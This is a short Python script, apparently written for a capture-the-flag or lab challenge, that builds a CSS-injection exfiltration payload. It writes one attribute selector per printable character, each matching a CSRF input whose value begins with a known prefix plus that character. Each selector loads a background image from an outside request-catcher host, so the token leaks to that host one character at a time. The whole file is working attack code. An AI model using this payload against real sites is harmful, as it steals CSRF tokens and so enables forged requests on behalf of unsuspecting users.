import string

prefix = "ruW-tjL1BWCd"
css = ""

for c in string.printable:
    if c == '"' or c == "\\":
        continue
    if c == "\t":
        break

    payload = f"{prefix}{c}"
    css += f"""
input[name="csrf"][value^="{payload}"] {{
  background-image: url("https://toto.requestcatcher.com/{payload}");
}}
"""

with open("style.css", "w") as f:
    f.write(css)
